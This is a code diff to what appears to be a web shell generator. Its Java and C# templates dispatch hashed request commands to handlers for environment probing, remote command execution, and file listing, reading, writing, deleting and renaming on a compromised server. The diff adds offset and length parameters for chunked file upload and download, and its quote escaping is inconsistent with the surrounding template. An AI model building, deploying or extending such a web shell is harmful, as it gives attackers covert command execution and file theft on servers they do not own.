@@ -109,19 +109,38 @@ static String DSW_list(String p) {{
         return sb.toString();
     }} catch (Exception e) {{ return "{{\\"ok\\":false,\\"error\\":\\"list failed\\"}}"; }}
 }}
-static String DSW_read(String p) {{
+static String DSW_read(String p, String o, String l) {{
     try {{
-        byte[] d = java.nio.file.Files.readAllBytes(new File(p).toPath());
-        return "{{\\"ok\\":true,\\"data\\":\\"" + java.util.Base64.getEncoder().encodeToString(d) + "\\"}}";
-    }} catch (Exception e) {{ return "{{\\"ok\\":false,\\"error\\":\\"read failed\\"}}"; }}
+        long off = (o == null || o.isEmpty()) ? 0 : Long.parseLong(o);
+        long len = (l == null || l.isEmpty()) ? -1 : Long.parseLong(l);
+        java.io.RandomAccessFile f = new java.io.RandomAccessFile(p, "r");
+        f.seek(off);
+        byte[] buf;
+        if (len >= 0) {{
+            long remain = f.length() - off;
+            int n = (int) Math.min(len, remain);
+            buf = new byte[n];
+            f.readFully(buf);
+        }} else {{
+            buf = new byte[(int) (f.length() - off)];
+            f.readFully(buf);
+        }}
+        f.close();
+        return "{{\"ok\":true,\"data\":\"" + java.util.Base64.getEncoder().encodeToString(buf) + "\"}}";
+    }} catch (Exception e) {{ return "{{\"ok\":false,\"error\":\"read failed\"}}"; }}
 }}
-static String DSW_write(String p, String d) {{
+static String DSW_write(String p, String d, String o) {{
     try {{
         byte[] data = java.util.Base64.getDecoder().decode(d);
-        java.nio.file.Files.write(new File(p).toPath(), data);
-        return "{{\\"ok\\":true,\\"data\\":null}}";
-    }} catch (Exception e) {{ return "{{\\"ok\\":false,\\"error\\":\\"write failed\\"}}"; }}
+        long off = (o == null || o.isEmpty()) ? 0 : Long.parseLong(o);
+        java.io.RandomAccessFile f = new java.io.RandomAccessFile(p, "rw");
+        f.seek(off);
+        f.write(data);
+        f.close();
+        return "{{\"ok\":true,\"data\":null}}";
+    }} catch (Exception e) {{ return "{{\"ok\":false,\"error\":\"write failed\"}}"; }}
 }}
+
 static String DSW_del(String p) {{
     try {{
         File f = new File(p);
@@ -157,8 +176,8 @@ String out = "{{\\"ok\\":false,\\"error\\":\\"unsupported\\"}}";
 if (h == {h_probe}) out = DSW_env();
 else if (h == {h_exec}) out = DSW_exec(DSW_val(req, "c"), DSW_val(req, "w"));
 else if (h == {h_list}) out = DSW_list(DSW_val(req, "p"));
-else if (h == {h_read}) out = DSW_read(DSW_val(req, "p"));
-else if (h == {h_write}) out = DSW_write(DSW_val(req, "p"), DSW_val(req, "d"));
+else if (h == {h_read}) out = DSW_read(DSW_val(req, "p"), DSW_val(req, "o"), DSW_val(req, "l"));
+else if (h == {h_write}) out = DSW_write(DSW_val(req, "p"), DSW_val(req, "d"), DSW_val(req, "o"));
 else if (h == {h_delete}) out = DSW_del(DSW_val(req, "p"));
 else if (h == {h_rename}) out = DSW_ren(DSW_val(req, "f"), DSW_val(req, "t"));
 else if (h == {h_mkdir}) out = DSW_mkdir(DSW_val(req, "p"));
@@ -280,14 +299,34 @@ static string DSW_list(string p) {{
         return sb.ToString();
     }} catch (Exception) {{ return "{{\\"ok\\":false,\\"error\\":\\"list failed\\"}}"; }}
 }}
-static string DSW_read(string p) {{
-    try {{ return "{{\\"ok\\":true,\\"data\\":\\"" + Convert.ToBase64String(File.ReadAllBytes(p)) + "\\"}}"; }}
-    catch (Exception) {{ return "{{\\"ok\\":false,\\"error\\":\\"read failed\\"}}"; }}
+static string DSW_read(string p, string o, string l) {{
+    try {{
+        long off = string.IsNullOrEmpty(o) ? 0 : long.Parse(o);
+        long len = string.IsNullOrEmpty(l) ? -1 : long.Parse(l);
+        using (var fs = File.OpenRead(p)) {{
+            fs.Seek(off, SeekOrigin.Begin);
+            long remain = fs.Length - off;
+            int n = len >= 0 ? (int)Math.Min(len, remain) : (int)remain;
+            byte[] buf = new byte[n];
+            fs.Read(buf, 0, n);
+            return "{{\"ok\":true,\"data\":\"" + Convert.ToBase64String(buf) + "\"}}";
+        }}
+    }}
+    catch (Exception) {{ return "{{\"ok\":false,\"error\":\"read failed\"}}"; }}
 }}
-static string DSW_write(string p, string d) {{
-    try {{ File.WriteAllBytes(p, Convert.FromBase64String(d)); return "{{\\"ok\\":true,\\"data\\":null}}"; }}
-    catch (Exception) {{ return "{{\\"ok\\":false,\\"error\\":\\"write failed\\"}}"; }}
+static string DSW_write(string p, string d, string o) {{
+    try {{
+        byte[] data = Convert.FromBase64String(d);
+        long off = string.IsNullOrEmpty(o) ? 0 : long.Parse(o);
+        using (var fs = new FileStream(p, FileMode.OpenOrCreate, FileAccess.Write)) {{
+            fs.Seek(off, SeekOrigin.Begin);
+            fs.Write(data, 0, data.Length);
+        }}
+        return "{{\"ok\":true,\"data\":null}}";
+    }}
+    catch (Exception) {{ return "{{\"ok\":false,\"error\":\"write failed\"}}"; }}
 }}
+
 static string DSW_del(string p) {{
     try {{ if (Directory.Exists(p)) Directory.Delete(p, true); else File.Delete(p); return "{{\\"ok\\":true,\\"data\\":null}}"; }}
     catch (Exception) {{ return "{{\\"ok\\":false,\\"error\\":\\"delete failed\\"}}"; }}
@@ -317,8 +356,8 @@ string outv = "{{\\"ok\\":false,\\"error\\":\\"unsupported\\"}}";
 if (h == {h_probe}) outv = DSW_env();
 else if (h == {h_exec}) outv = DSW_exec(DSW_val(req, "c"), DSW_val(req, "w"));
 else if (h == {h_list}) outv = DSW_list(DSW_val(req, "p"));
-else if (h == {h_read}) outv = DSW_read(DSW_val(req, "p"));
-else if (h == {h_write}) outv = DSW_write(DSW_val(req, "p"), DSW_val(req, "d"));
+else if (h == {h_read}) outv = DSW_read(DSW_val(req, "p"), DSW_val(req, "o"), DSW_val(req, "l"));
+else if (h == {h_write}) outv = DSW_write(DSW_val(req, "p"), DSW_val(req, "d"), DSW_val(req, "o"));
 else if (h == {h_delete}) outv = DSW_del(DSW_val(req, "p"));
 else if (h == {h_rename}) outv = DSW_ren(DSW_val(req, "f"), DSW_val(req, "t"));
 else if (h == {h_mkdir}) outv = DSW_mkdir(DSW_val(req, "p"));
